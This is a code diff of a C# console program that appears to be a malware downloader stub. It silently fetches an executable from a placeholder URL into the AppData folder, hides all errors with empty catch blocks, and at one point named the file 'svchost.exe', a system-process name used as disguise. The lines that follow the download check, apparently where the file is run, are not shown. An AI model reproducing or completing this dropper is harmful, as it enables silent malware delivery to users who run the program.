@@ -30,15 +30,13 @@ namespace ConsoleApplication3
         //ZONEID^
         static void Main(string[] args)
         {
-            try
-            {
                 string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                 try
                 {
                     //
                     //
                     new WebClient().DownloadFile("http://url/file.exe", path + "//" + "nameoffile.exe");
-                    if (File.Exists(path + "//" + "svchost.exe") == true)
+                    if (File.Exists(path + "//" + "nameoffile.exe") == true)
                     {
                         try
                         {
@@ -49,8 +47,6 @@ namespace ConsoleApplication3
                     }
                 }
                 catch { }
-            }
-            catch { }
         }
     }
 }
